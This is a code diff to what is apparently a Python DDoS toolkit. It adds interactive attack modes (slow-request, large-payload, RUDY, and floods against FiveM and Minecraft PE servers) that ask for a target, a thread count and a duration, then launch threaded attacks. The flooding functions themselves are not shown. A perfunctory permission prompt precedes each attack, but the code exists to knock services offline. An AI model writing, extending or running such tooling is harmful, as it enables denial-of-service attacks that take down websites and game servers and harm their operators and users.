@@ -177,6 +177,60 @@ def DdosCFB():
         print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
         sys.exit()
 
+def DdosSLOW():
+    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
+    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
+    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
+    
+    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
+    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")
+
+    if "Y" in quest.upper():
+        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
+        timer.start()
+        LaunchSLOW(target, thread, t)
+        timer.join()
+    else:
+        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
+        sys.exit()
+        
+def DdosMBP():
+    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
+    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
+    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
+    mb = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Payload MB : ")
+    
+    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
+    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")
+
+    if "Y" in quest.upper():
+        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
+        timer.start()
+        LaunchMBP(target, thread, t,mb)
+        timer.join()
+    else:
+        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
+        sys.exit()
+        
+def DdosRUDY():
+    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
+    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
+    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
+        
+    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
+    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")
+
+    if "Y" in quest.upper():
+        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
+        timer.start()
+        LaunchRUDY(target, thread, t)
+        timer.join()
+    else:
+        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
+        sys.exit()
+
+
+        
 def DdosUDP():
     target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
     port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
@@ -206,6 +260,42 @@ def DdosTCP():
 
     if "Y" in quest.upper():
         threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
+        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
+        timer.start()
+        timer.join()
+    else:
+        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
+        sys.exit()
+
+def DdosFIVEM():
+    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
+    port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
+    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
+    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
+    
+    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
+    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")
+
+    if "Y" in quest.upper():
+        threading.Thread(target=LaunchFIVEM, args=(target, port, thread, t)).start()
+        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
+        timer.start()
+        timer.join()
+    else:
+        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
+        sys.exit()
+
+def DdosMCPE():
+    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
+    port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
+    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
+    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
+    
+    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
+    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")
+
+    if "Y" in quest.upper():
+        threading.Thread(target=LaunchMCPE, args=(target, port, thread, t)).start()
         timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
         timer.start()
         timer.join()
